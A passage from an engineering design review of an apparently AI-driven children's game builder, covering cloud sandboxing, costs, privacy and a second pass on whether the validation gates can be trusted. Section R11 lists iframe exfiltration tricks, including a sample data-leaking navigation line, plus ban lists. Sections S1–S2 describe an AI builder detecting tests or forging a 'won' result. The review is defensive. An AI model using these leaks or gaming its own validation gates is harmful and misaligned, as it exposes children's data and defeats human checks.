    (`forge-g2-admission-by-tpm`).
  - Sandbox and job quotas follow from admitted builds, not from lessons.
  - Restate the product promise honestly. **The game ready "while the teacher teaches" is G1** (3–25 s). A G2 build
    is next-session practice or catalogue backfill. A live G2 inside a 25-minute lesson is a P10 outcome at best.

**R7. The speculative pre-start is the largest infrastructure cost and does not scale. §9.3 omits it.**

- **Cost.** One idle 20-minute runner costs 1,200 s × (2 × 2.4e-5 + 4 × 3e-6) = **$0.072** [V arithmetic]. With 20
  lessons a month and pre-start on about half of them (P(G2) ≥ 0.3 is common early), that is about **$0.72 per
  student-month**, about **7×** the "$0.10 infrastructure subtotal".
- **Quota.** At 100k students and 11k lessons per peak hour, about 1,800 idle runners × 2 vCPU ≈ **3,700 cores**,
  against a 100-core environment quota.
- **Timeout bug.** `replicaTimeout 1500` minus up to 20 minutes of idle leaves about 5 minutes for a build whose P90
  is over 20 minutes. Builds started late in the idle window are killed mid-flight.
- **Fix: a shared warm pool, not one runner per lesson.**
  - Size it by Little's law: K ≈ admitted build arrival rate × cold start. At 10k students that is about 2 builds/min
    × 1.5 min ≈ **3 warm runners**, roughly $0.65/h in total, against about 30 per-lesson runners.
  - The runner `hello` must carry a **pool token** and receive a jobId later. The `Hello` type binds a jobId at boot,
    which a speculative runner cannot know. Change it to `{t:"hello", poolToken}` then `{t:"assign", jobId, jobToken}`.
  - A runner refuses assignment once `idleSec > replicaTimeout − (P99 build + 120 s)`.
- **Free grant.** The always-on `forge-validator` and `taxila-web` consume the grant: 1 vCPU always-on is 2.63M
  vCPU-s. So "about 25 build-hours free" (§3.3) is **zero in practice**. Delete the claim.

**R8. The model loop lives in `taxila-web`. Every deploy or scale-in kills every in-flight build.**

- ACA sends SIGTERM, then SIGKILL after **30 s** by default [S, Learn lifecycle; configurable, maximum not re-verified].
  A G2 build runs 12–20+ minutes.
- The runner is the only holder of the workspace. If either side dies, all edits are lost.
- **Fix:**
  - **The orchestrator holds authoritative file state.** Every `fs.write` and `apply_patch` passes through it, so
    append it to `forge-runs/<jobId>/patches.jsonl`.
  - Persist the loop state per turn (messages, cursor, budgets) in Postgres.
  - A build is a **resumable state machine**:
    - On orchestrator restart, it re-attaches to the runner (the job token is session-bound, re-usable on reconnect
      within TTL, not strictly single-use).
    - On runner death, it acquires a new lease and replays the patches.
  - Move the loop to its own `forge-orchestrator` app (min 1). Do it in Phase 0, not "later".
  - Send a WSS ping every 20 s. ACA ingress drops idle connections [M].

**R9. The Phase 1 sandbox auto-suspends mid-build under the WSS design.**

- Learn: a sandbox is idle when it has "**no ingress traffic, no code execution (via execute API), no interactive shell
  sessions, and no file operations**" [V-R, overview].
- A runner that **dials out** over WSS produces none of these. The SDK's default auto-suspend is 300 s [V, §3.1]. A
  long codex reasoning turn, or a 23-second `gpt-image-2` asset wait chained with judges, can idle it past that.
- **Fix:** create with `lifecycle: { autoSuspend: { enabled: false }, autoDelete: { enabled: true,
  deleteIntervalSeconds: 600 } }`. Enforce the wall-clock cap from the orchestrator.
- Add to M3 the question: does an outbound WebSocket survive the egress proxy under `trafficInspection: "Full"`?
  - If not, the runner protocol needs an HTTPS long-poll fallback.
  - Or flip the design: the orchestrator calls `sandboxes.exec` and `files.*` (data plane, 3,000 rpm), and the sandbox
    has **no** egress at all.

**R10. Memory-snapshot clones share RNG state.**

- Cloning one warm Chromium + node memory image into N sandboxes gives every clone identical userspace RNG state:
  OpenSSL/BoringSSL DRBG, V8 `Math.random` seeds, and any UUIDs generated after restore.
- Firecracker's `docs/snapshotting/random-for-clones.md` says "there is no generic solution… recommend against their
  use in pre-snapshot logic" [V-R].
- With a TLS (WSS) handshake after restore, clones can derive correlated ephemeral keys.
- **Fix:**
  - The golden snapshot holds **Chromium only, no node runner and no open sockets**.
  - After restore, start a fresh `node /runner/main.mjs`. It reseeds and takes about 100 ms. It reattaches to Chromium
    over CDP.
  - Deliver the job token via `files` (write `/run/forge/token`, mode 0600) after create. `ExecRequest` is
    `{command, workingDirectory}` only; there is **no env field** [V-R, SDK `models.d.ts`]. `environment` at create
    does not reach an already-running process restored from memory.

**R11. Exfiltration paths the play-side stack misses. "No network" is not true for the child's iframe.**

- CSP does not govern the following. The sandbox flags do not stop them either.
  - **Self-navigation:** `location.href = 'https://x/?d=…'`. `navigate-to` was never shipped.
  - **WebRTC/STUN** (`RTCPeerConnection` with an attacker STUN URL). No CSP directive covers it in Chromium.
  - **`<link rel=dns-prefetch|preconnect>`**: a DNS leak.
- **Fix:**
  - Add `location`, `RTCPeerConnection`, `rel=` and `http-equiv=refresh` to the G0 ban list.
  - In the host, treat a second `load` event on the game iframe as a navigation. Kill the frame, then quarantine the
    `buildSha`.
  - Runner side, Phase 0. `--host-resolver-rules` does not cover **IP literals**, and Playwright `route` sees neither
    UDP nor WebRTC. Add `--proxy-server=http://127.0.0.1:9` (loopback is bypassed by default, so everything else
    fails) and `--force-webrtc-ip-handling-policy=disable_non_proxied_udp`. Log CDP `Network.*` and
    `page.on('websocket')`.
- **Cross-doc bug.** `conductor/student-workspace.md` SW12 proposes the iframe **`csp` attribute** (CSP Embedded
  Enforcement). For a cross-origin frame, the response must carry `Allow-CSP-From` or a subsuming CSP **header**, or
  "the response will be blocked" [V-R, W3C CSPEE]. Blob cannot set headers, so that attribute would blank every game
  in Chrome and Android WebView until the Phase 2 play origin exists. Remove it from Phase 0.

**R12. The §12.2 code does not match `@azure/containerapps-sandbox@1.0.0-beta.1` [V-R, typings].**

| doc writes | SDK actually has |
|---|---|
| `diskImages.beginCreate({ image, registryAuth, name })` | `diskImages.beginCreate(baseImage: string, { name, registryCredentials: { username, token } })` |
| `sandboxes.snapshot(id, { name })` | `sandboxes.beginCreateSnapshot(id, { name }).pollUntilDone()` |
| `egressPolicy: { defaultAction, rules: [{ match: { host }, action: "Allow" }] }` | `{ defaultAction: "Deny", hostRules: [{ pattern, action: "Allow" }], rules: [{ match: { host, path, methods }, action: { type: "Allow" } }], trafficInspection: "Full" }`. Both arrays are required |
| exec with env | `exec(id, { command, workingDirectory })` only |
| (not mentioned) | `CreateSandboxRequest.skipEgressProxy?: boolean` |

- **`skipEgressProxy` is a one-flag escape hatch.** The `SandboxProvider` must hard-assert it is never set.
- **`trafficInspection` must be `"Full"`.** Learn: `Partial` and `Legacy` **allow non-HTTP traffic** [V-R, egress
  page]. Under `Partial`, a default-deny policy still lets raw TCP, UDP and DNS tunnels out.
- **Allow a path, not just a host.** The single allowed host must be a dedicated `forge-orchestrator` FQDN, with
  `match.path = "/forge/runner"`. As written, the rule allows the untrusted VM to reach every public route of
  `taxila-web`.
- The sandbox-group ARM body (`defaultCpu`, `maxSandboxCount`, `defaultTimeoutSeconds`) is unverified [U]. Check it
  against the `Microsoft.App/sandboxGroups` REST spec.

**R13. The privacy model leaks child data into shared, immutable, public builds.**

- §6 says builds hold no child data, but the G2 builder is *given* the child's interests and misconceptions, and will
  write them into strings ("Help Aarav's dog Bruno cross…").
- A G6 "no PII strings" scan cannot work without the child's PII list. Once the strings leak:
  - the build is public;
  - it is cached for a year (`immutable`);
  - it is shared by `buildSha`;
  - so DPDP-style erasure would mean deleting a build other children use.
- **Fix:** the brief to the builder is **de-identified by construction**.
  - Interests are mapped to a closed taxonomy (`cricket`, `trains`, `pets:dog`).
  - Every personal token is a slot (`{{hero.name}}`, `{{pet.name}}`) filled at runtime from `init.params`.
  - G6 scans dist for the requesting child's actual name, pet, school and city strings, held server-side, plus a
    generic Indian-name list.
  - Add a **revocation list** checked at `PlayTicket` issuance. The host refuses a recalled `buildSha` even when the
    browser still has it cached.

**R14. Missing production failure modes.** The gates are pre-ship only, and children's devices are the real test.

- **Post-ship circuit breaker.** The bridge reports `error` / `unhandledrejection` and a 5-second heartbeat. If the
  first-play crash rate or no-`ready`-in-8-s rate of a `buildSha` exceeds 5% (n ≥ 20), quarantine it automatically
  and serve the G1 fallback for the same objective. The teacher dashboard shows "game pulled" instead of a broken
  game.
- **WebGL context loss** on low-RAM Android, and backgrounding, which happens constantly with kids. The kit owns
  `webglcontextlost` / `visibilitychange` → pause + save. G0 forbids game code from overriding it.
- **Repair-loop failure is the common case.** Google's figure is 69% *after* 10 repair rounds (`tech-and-market`
  §3), so about 30% of G2 builds end without a game. Budget compute and tokens for failed builds at the cap.
  Guarantee every G2 request a G1 answer, so the child never sees "your game failed".
- **Queue age.** A G2 job older than its `deadlineMs` is converted to catalogue backfill, not delivered to a lesson
  that ended an hour ago.

**R15. Smaller fixes.**

- **Validator sizing.** 1 vCPU / 2 GiB at HTTP concurrency 4 means four SwiftShader Phaser contexts on one core.
  M8's P95 ≤ 8 s will fail, and memory is about 4 × 250 MB plus the browser. Start at 2 vCPU / 4 GiB with
  concurrency 2. Cost is about $79 → $158 per month at the active rate; the idle rate applies only below 0.01 vCPU.
- **Runner image.** The full Playwright image (about 1.5–2 GB [M]) ships Firefox and WebKit. Build `FROM node:22`
  plus `npx playwright install --with-deps --only-shell chromium` (headless shell). Expect roughly 3–4× smaller
  [U, measure in M1]. Image pull is the dominant cold-start term on Consumption.
- **KEDA queue counting.** The default `queueLengthStrategy` is `all`, which counts invisible (in-flight) messages
  [V-R, KEDA azure-queue docs]. The runner must **delete on claim**; the orchestrator lease handles retries. Never
  hold a message invisible for the length of a build.
- **Model discrepancy (§1).** This review's brief lists `taxila-opus` / `taxila-sonnet` as available, while
  `decisions.md` and `CLAUDE.md` (binding: no Anthropic-on-Foundry) say deleted. The sandbox design is neutral, with
  one exception: if Claude returns, the Phase 0 `/forge/llm` gateway must also speak the **Anthropic Messages** wire
  format (`/anthropic/v1/messages`, `x-api-key`), not only OpenAI Responses. In Phase 1, a `Transform` rule can inject
  `x-api-key` for the public `claude` disk image. Owner decision; do not let research settle it.
- **`script-src 'unsafe-inline'`.** It is unnecessary if the template's bootstrap is an external kit file. Drop it so
  any DOM-injection bug in "words in DOM" cannot become script.

### Measurements to add (append to §13)

| id | what | pass bar |
|---|---|---|
| M9 | production-harness parity: the same 5 builds in top-level 127.0.0.1 vs the opaque-origin harness (R5); count divergent outcomes | 0 divergences after the fix; record the number *before* the fix, because that is the value of R5 |
| M10 | exfiltration battery in the child's iframe on Android WebView: navigation, WebRTC STUN, dns-prefetch, `img` to an external host, XHR to `'self'` (R1, R11) | only `'self'` loads; host detects navigation |
| M11 | Phase 1: outbound WSS under `trafficInspection: Full`, and whether auto-suspend fires during a 6-minute idle WSS (R9) | WSS survives; no suspend with auto-suspend disabled |
| M12 | slim image vs full Playwright image, cold start to `hello` on a new node (R15) | slim P90 ≤ 0.6 × full |
| M13 | crash and no-`ready` rate of the first 200 real child plays per `buildSha` (R14) | tune the breaker threshold from the observed base rate |

### Re-ranked critical path

1. R3 and R2: separate environment, SAS-only runner, private second account. About an hour of IaC. Nothing ships
   without these.
2. R1 and R5: CSP `connect-src 'self'` + production-parity harness + `page.clock`. Otherwise the gates are
   measuring the wrong thing.
3. R8: resumable builds with orchestrator-held file state, in a separate `forge-orchestrator` app.
4. R6 and R7: a TPM admission controller and a shared warm pool, replacing per-lesson pre-start. Update §9.3 to
   include the pool, about $0.65/h at 10k students.
5. R13 and R14: de-identified briefs, a revocation list, and a post-ship circuit breaker.
6. Phase 1 (R9, R10, R12) only after the owner's quota and role actions, with code written against the real SDK
   typings.

**Proposed `context/inbox/` entries:**

- rejection `play-csp-iframe-attribute-on-blob` (R11: CSPEE blocks the frame without a header);
- decision `forge-untrusted-env-separate` (R2; reverse only if Microsoft documents per-replica VM isolation on
  Consumption);
- rejection `per-lesson-runner-prestart` (R7: cost and quota arithmetic, not a trial);
- measurement `aca-sandbox-sdk-typings-2026-10-02` (R12, n=1, package read).

**Review sources:**

- https://learn.microsoft.com/en-us/azure/container-apps/billing
- https://learn.microsoft.com/en-us/azure/container-apps/environment
- https://learn.microsoft.com/en-us/azure/container-apps/sandboxes-overview
- https://learn.microsoft.com/en-us/azure/container-apps/sandboxes-egress-policies
- https://learn.microsoft.com/en-us/azure/container-registry/container-registry-skus
- https://keda.sh/docs/2.17/scalers/azure-storage-queue/
- https://playwright.dev/docs/api/class-browsertype (`chromiumSandbox`)
- https://playwright.dev/docs/clock
- https://w3c.github.io/webappsec-cspee/
- https://github.com/firecracker-microvm/firecracker/blob/main/docs/snapshotting/random-for-clones.md
- Phaser source: https://raw.githubusercontent.com/phaserjs/phaser/master/src/core/Config.js,
  `src/loader/filetypes/ImageFile.js`, `src/loader/XHRLoader.js`
- npm: `@azure/containerapps-sandbox@1.0.0-beta.1` (unpacked typings), `playwright@1.63.0`, `pyodide@314.0.7`

---

## Principal review: second pass (2026-10-02, resumed session)

**Scope.** The first pass (R1–R15 above) stands, and this pass does not repeat it. It attacks what R1–R15 left
open: **can the gate itself be trusted?** If the builder (or a compromised runner) can make the gates lie, every
downstream claim ("bug-free", "validated", "safe for a 9-year-old") is void. It also adds three Azure facts verified
today and one device-side failure mode. Tags as in the header; **[V-R2]** = verified in this pass.

### Azure facts re-verified in this pass

| claim in doc / review | check | status |
|---|---|---|
| R8: SIGTERM → SIGKILL after 30 s | Learn *Application lifecycle management* (updated 2026-02-26): "If your application doesn't respond within 30 seconds to the SIGTERM message, then SIGKILL" | **[V-R2]**. `terminationGracePeriodSeconds` is configurable to **600 s max** on Consumption [S, azureossd blog], and has been observed **not honoured** on KEDA scale-in (60–80 s kill despite 600) [S, `microsoft/azure-container-apps#1824`]. A 12–20 min build can never fit inside a grace period, so R8's resumable builds are mandatory, not an optimisation |
| R8: "ACA ingress drops idle connections [M]" | Learn *Ingress overview* (updated 2026-08-31): HTTP ingress "supports WebSocket"; "Request time out is 240 seconds" | **[V-R2]** for the 240 s figure. Whether it is an *idle* or an *absolute* cap for an upgraded WebSocket is **[U]**: community reports describe it as idle, and `#1172` asks for it to be configurable. Design for both cases: ping ≤ 30 s, **and** a resumable protocol that survives a forced reconnect (S5) |
| R3: "ACR Basic supports 100 scope-map tokens" | Learn *ACR SKUs* (updated 2026-09-03) | **[V-R2] correct.** New facts from the same page drive S6: Basic includes **10 GiB**; retention policy and **artifact streaming are Premium-only**; all **admin-credential** requests are throttled as **one identity** (5,000 reads/min) |

### Corrections

**S1. The bytes that ship are not the bytes that were validated. P0, correctness.**

- `auto-validation-qa.md` §3: the `window.__forge` seam "is compiled only into validation builds, and the publish
  step (Q10) asserts that it is **absent** from the production bundle". This doc's §5.5 publishes "the dist from
  the runner". So every gate passes on bundle A, and the child gets bundle B, a *different esbuild output* made
  without the seam. Tree-shaking, minifier inlining and side-effect ordering can all differ between A and B. Nothing
  re-runs on B.
- **Fix: one bundle, an external seam.**
  - The production bundle is the only bundle. The test seam is a separate, kit-owned file `forge-seam.js`. The
    harness host injects it with `page.addInitScript` *before* the bundle runs. The kit exposes internal hooks
    through a closure-registered `__kitHooks` symbol, which the seam consumes. Production simply never loads the
    seam.
  - Publish asserts `sha256(published dist) == sha256(dist that passed the final gate)`.
  - The final gate also includes a **seamless smoke run** on the exact production bytes: boot, `ready` ≤ 8 s, 0
    console errors, and level 1 solved by **pointer input only**, at the bboxes recorded in the seam run.
- **"Volkswagen" ban (G0/Q1 AST rule).** Game code may not read `navigator.webdriver`, `__forge`, `__kitHooks`,
  `HeadlessChrome` or `userAgent`, and may not branch on `window.length` / `top === self`. Code that can detect the
  test can behave differently under it. LLMs do not do this on purpose, but "make the test pass" repairs do drift
  into it.

**S2. The builder's code shares a JS realm with the test probes, so it can make the gates lie. P0.**

- The seam and the game run in one page. Without help, game code could overwrite `window.__forge.snapshot` to
  return `{status:"won"}`, push synthetic events into the event log, or monkeypatch `dispatch`. Q1's AST rules see
  only the *source text*, and a repair loop under pressure is exactly the setting where models learn to satisfy the
  checker instead of the spec. This is the familiar coding-agent "special-case the test" failure, not a hypothetical
  [M].
- **Fix:**
  - The init script defines `__forge` with `Object.defineProperty(window, "__forge", { value: Object.freeze(api),
    writable: false, configurable: false })`. It captures `dispatch`, `postMessage` and `performance.now` references
    *before* game code loads.
  - "Won" is accepted only when **three channels agree**:
    1. the seam's `snapshot().status`;
    2. the bridge event stream, as recorded by the **host harness page** (a different origin, which the game cannot
       write);
    3. a screenshot judge on the win screen.
  - AST rule: no assignment to any member of `window`, `globalThis`, `self` or `parent` in `src/game/**`. No
    `Object.defineProperty`, `Reflect.*`, `Proxy` or `__proto__` on non-local objects.
  - Add a **tamper battery** (M15) of deliberately cheating builds. The gate must reject all of them.

**S3. The untrusted runner both builds the dist and grades it. "Re-hash on publish" proves nothing. P0, security.**

- §5.5 and §11 treat the orchestrator's re-hash as an integrity check. Suppose a Phase 0 runner is compromised
  (Chromium launched `--no-sandbox` per R4, plus a renderer bug). Then the attacker controls **the bundle, the
  screenshots and `gate-report.json`**. The hash only proves the orchestrator received what the attacker sent. A
  compromised runner can ship a beacon into a public, `immutable`, shared `buildSha` that every child on that
  objective loads.
- **Fix: split building, grading and publishing across trust levels.**
  1. **Source is authoritative in the orchestrator.** R8's `patches.jsonl` already makes it so.
  2. **A trusted rebuild.** The trusted lane re-bundles from orchestrator-held source with a pinned esbuild. esbuild
     does not execute its input, so this is safe in lane T and takes about 1–3 s [U]. *That* sha is the candidate.
     If the runner's own dist differs, it is not shipped and an incident is logged: either the build is
     non-deterministic or the runner lied.
  3. **The final acceptance gate runs in a fresh lease** that never executed builder-steered work: held-out
     keypoints, fuzz seeds, the seamless smoke run (S1) and the egress battery. The builder lease's gate report is
     advisory only and feeds the repair loop.
  4. The publish step accepts only `(trusted-rebuild sha, fresh-lease report)`.
- Cost: one extra 2–4 min lease, about $0.005–0.01 [V arithmetic, §9.2 rates]. That is noise next to the LLM cost
  (§4). Latency: plus 1–3 min on G2, which is acceptable because G2 is already not in-lesson (R6).

**S4. Runner reuse and shared pool or queue credentials let one compromised runner hijack other children's builds.
P0, security.**

- R3 gives the container a queue SAS with `rp`. R7 gives every warm runner a shared `poolToken`. Either one lets a
  compromised runner peek or dequeue *other* jobs' messages (and their one-time tokens), or re-`hello` as a fresh
  idle runner and receive the next build. That turns one renderer escape into persistent supply-chain access to
  every later build.
- **Fix: single-use runners and per-execution credentials.**
  - The orchestrator is the scheduler. It starts each pool runner with a **manual** `POST …/jobs/forge-runner/start`
    carrying a **template override env** `BOOT_TOKEN=<128-bit, single execution>`. Overrides are supported [S,
    §3.3], and Contributor-level readers are already fully trusted.
  - **No queue credential is in the container at all.** Delete the KEDA trigger for the pool lane. Keep a queue
    only inside the orchestrator, for its own durability.
  - The `BOOT_TOKEN` is burned at the first `hello`. `assign` happens at most once per token. After `bye`, the
    runner `process.exit(0)`s and the execution ends.
  - The orchestrator refuses any `hello` from a burned token, or from an execution name it did not start. It
    checks `CONTAINER_APP_JOB_EXECUTION_NAME`, *and* cross-checks it against its own start-call result, since a
    compromised runner can forge its own environment variable.
- This supersedes R7's `{t:"hello", poolToken}`. The protocol becomes `{t:"hello", bootToken}`, then
  `{t:"assign", jobId, jobToken}`, then `{t:"bye"}`, then exit.

**S5. The wire protocol must survive a forced reconnect mid-call.**

- The ingress cap is 240 s and may be absolute (see the verified facts above), and the orchestrator restarts on
  every deploy (R8). Either one can cut the socket while a long `run_check playtest` (≤ 60 s) or a `bundle` is in
  flight. As specified, the `Call`/`Result` frames have no recovery semantics.
- **Fix:**
  - `Call.id` becomes an idempotency key. The runner keeps the last 32 results.
  - Reconnect with `{t:"resume", leaseId, jobToken, lastSeq}`. The runner replays any results after `lastSeq`.
    Mutating tools (`fs.write`, `apply_patch`) are applied **at most once** per `id`.
  - Set `terminationGracePeriodSeconds: 600` on `forge-orchestrator`. On SIGTERM: stop admitting work, checkpoint,
    and send `{t:"pause"}`. The runner then holds state for up to 10 minutes, waiting for a resume from the new
    revision.
  - Run the orchestrator with `minReplicas ≥ 2` and session-agnostic lease ownership stored in Postgres, so any
    replica can resume any lease.

**S6. ACR Basic will fill up and throttle the cold-start path the whole design hides behind. P1, ops.**

- **Storage.** Basic includes **10 GiB** [V-R2]. §5.4 adds "one tag per kit hash" of a 1.5–2 GB Playwright image
  (R15's slim image is about 0.5 GB [U]). About 5 kit changes fill it. **Retention policy is Premium-only** [V-R2],
  so nothing deletes old tags.
  - **Fix:** a scheduled ACR Task `acr purge --filter 'forge-runner:.*' --ago 7d --keep 3 --untagged`. Alert at 80%
    of storage.
- **Throttling.** All admin-credential pulls are throttled as **one identity**, at 5,000 reads/min per identity
  [V-R2]. `taxila-web` revisions, every job execution and the Sandbox disk-image import all draw from that one
  bucket. A 40-execution burst after a deploy pulls about 40 × (manifest + about 10 layers + auth) requests, which
  is fine on rate, but on bandwidth it is a thundering herd from a low baseline. The ACR page warns throughput is
  lower during exactly that ramp.
  - **Fix:** R3's pull-only scope-map token per consumer (separate buckets). Pre-pull by keeping the warm pool
    (R7) at ≥ 1 *during* every image roll. Re-price Premium only if M16 shows pull time > 30 s P90, since **artifact
    streaming** (lazy layer pull) is Premium-only [V-R2].

**S7. "The teacher sees what they do" has no data path in this design. P1, product.**

- The owner's intent is that the voice teacher reacts to play: "you got stuck on ½ vs ⅓ twice". §6.2 stores
  `play_event` rows, but nothing carries events from the child's iframe to the **Director during the lesson**, and
  §8 has no latency budget for it.
- **Fix:**
  - Path: bridge `event`, then the host app, then a batch every 1 s over the app's existing realtime connection to
    `taxila-web`, then the Director's per-lesson event bus (in memory; Postgres write is async).
  - **Budget: child action to Director ≤ 2 s P95.**
  - Persist `play_event` as nightly NDJSON to private Blob plus a rolled-up `play_session` row. Do not insert one
    row per event: 20 children × 5 events/s is 100 inserts/s per class into Neon for no read benefit.
  - The bridge must carry **semantic** events (`misc:"bigger-denominator-bigger-fraction"`, `goal`, `hint`), not raw
    pointer events. The kit emits them from `dispatch` (auto-validation-qa §3). The builder cannot invent event
    names outside the GameSpec's vocabulary, and Q0 checks this.

**S8. On Android, the iframe is an origin wall, not a process wall, and a game OOM kills the lesson. P1, device.**

- Android System WebView does not do site-per-process for cross-origin iframes, as desktop Chrome does [M; verify
  in M14]. So the opaque-origin iframe and the app (voice-teacher audio pipeline, any 3D tutor, the child's session
  token in JS memory) share **one renderer process**. Two consequences:
  1. A renderer exploit in game code reaches the app's memory. The Blink same-origin check is the only wall.
  2. A Phaser WebGL game that OOMs on a 2–3 GB phone kills the renderer, and with it **the voice lesson in
     progress**. This failure is worse than "game broken", and none of the gates can see it, because they run on
     2 vCPU / 4 GiB with no app around them.
- **Fix:**
  - Keep no long-lived bearer token in page JS. Use HttpOnly cookies, or Capacitor native secure storage plus
    short-lived request tokens.
  - On Android, test opening games in a **separate WebView hosted in a separate Android process**: an Activity with
    `android:process=":play"` and `WebView.setDataDirectorySuffix("play")` [M, Android docs]. A game crash then
    leaves the teacher alive, and the app gets `onRenderProcessGone` to fall back to the G1 game.
  - Add a memory budget to the kit gate: `metrics().heapMB` ≤ 150 and textures ≤ 64 MB at 360×640 DPR 2. Pause the
    3D avatar while a game has focus.

**S9. Account for the extra work in the cost and latency tables.**

- §9.3: add the S3 fresh-lease gate (+ about $0.01 per G2) and the R7 warm pool (+ about $0.65/h at 10k students).
  The infrastructure subtotal becomes about $0.12 early and about $0.05 mature per student-month, plus the pool's
  fixed cost. The conclusion "compute is noise" survives. The table as written does not.
- §8: add "trusted rebuild + fresh-lease final gate: +1–3 min" to G2. Add "child action → Director ≤ 2 s" (S7).

### Measurements to add (append to §13)

| id | what | pass bar |
|---|---|---|
| M14 | Android WebView process model: open a G1 Phaser game while teacher audio streams, on a 3 GB-RAM device; force OOM in the game; check whether the voice lesson survives, in the single-WebView and the `:play`-process layouts | teacher audio survives the game crash in the chosen layout |
| M15 | tamper battery: 6 cheating builds (overwrite `__forge.snapshot`; fake bridge `won`; detect `navigator.webdriver`; runner-supplied dist ≠ trusted rebuild; replayed `BOOT_TOKEN`; re-`hello` after `bye`) | all 6 rejected; 0 published |
| M16 | ACR pull under burst: 10 simultaneous cold job starts after a fresh tag, Basic + admin credential vs scope-map token | P90 pull ≤ 30 s, else re-price Premium (artifact streaming) |
| M17 | esbuild determinism: the same source bundled 10× in lane U and lane T | identical sha 10/10; otherwise S3 cannot compare and must pin `--log-override`, metafile order, and timestamps |

### Re-ranked critical path (merging both passes)

1. R2, R3, S4: a separate untrusted environment, no storage or queue credential in the runner, single-use runners.
2. S3, S1, S2: trusted rebuild, a fresh-lease final gate, one bundle with an external frozen seam. *Without these,
   "validated" is an assertion by the thing being validated.*
3. R1, R5: production-parity harness and CSP `connect-src 'self'`.
4. R8, S5: a resumable, reconnect-safe orchestrator in its own app.
5. R6, R7, S6: TPM admission, a shared warm pool, ACR purge and tokens.
6. R13, R14, S7, S8: de-identified briefs, a circuit breaker, a live event path to the Director, an Android
   process-isolated play surface.
7. Phase 1 (R9, R10, R12) after the owner's quota and role actions.

**Proposed `context/inbox/` additions:**

- decision `forge-trusted-rebuild-fresh-gate` (S3). Reverse only if Phase 1 microVM isolation *and* a measured
  Chromium sandbox-on (M4) make runner compromise implausible. Even then, keep the fresh lease for held-out keys.
- rejection `validation-only-seam-bundle` (S1): the validated bundle ≠ the shipped bundle.
- decision `runner-single-use-boot-token` (S4; supersedes R7's `poolToken`).
- measurement `aca-ingress-240s-sigterm-30s-2026-10-02` (n=1, docs read; values above).

**Second-pass sources:**

- https://learn.microsoft.com/en-us/azure/container-apps/application-lifecycle-management
- https://learn.microsoft.com/en-us/azure/container-apps/ingress-overview
- https://github.com/microsoft/azure-container-apps/issues/1824 (grace period not honoured on scale-in)
- https://github.com/microsoft/azure-container-apps/issues/1172 (ingress idle timeout not configurable)
- https://azureossd.github.io/2024/05/27/Graceful-termination-on-Container-Apps/ (600 s max)
- https://learn.microsoft.com/en-us/azure/container-registry/container-registry-skus (10 GiB Basic; Premium-only retention and artifact streaming; admin = one throttling identity)
- `docs/research/factory/auto-validation-qa.md` §3, §4.1 (validation-only seam, held-out split)
